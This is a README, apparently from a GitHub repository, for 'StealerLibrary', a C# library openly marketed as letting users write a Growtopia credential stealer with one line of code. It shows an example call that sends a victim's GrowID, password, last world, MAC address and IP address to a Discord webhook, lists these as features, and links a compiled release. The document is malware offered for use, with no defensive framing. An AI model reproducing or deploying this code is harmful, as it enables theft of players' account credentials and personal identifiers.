# StealerLibrary
Growtopia (Save.dat) Stealer Library that basically let you to write a stealer with 1 line of code.

## Compiled Version: [Release V1](https://github.com/extatent/StealerLibrary/releases/tag/V1)

### Compile the source code with Visual Studio and add the .DLL to the references in your project and start writting the code below.

## Example Usage : 

```csharp
using StealerLibrary;
using System;

namespace Example
{
    class Program
    {
        private static void Main()
        {
            Growtopia.Stealer("https://discord.com/api/webhooks/1234567891011/WebhookUrl", "ProfilePictureUrl [Optional]", "Webhook Name", true, true, false);
        }
    }
}
```
1. Webhook Url
2. Profile Picture Url
3. Webhook Name
4. Last World (True/False)
5. MAC Address (True/False)
6. IP Address (True/False)

## Features

- GrowID
- Password
- Last World (Customizable: True/False)
- MAC Address (Customizable: True/False)
- IP Address (Customizable: True/False)

## StealerLibrary is licensed under the GNU General Public License v3.0. Before doing anything with the source code, please read [this.](https://www.gnu.org/licenses/gpl-3.0.html)
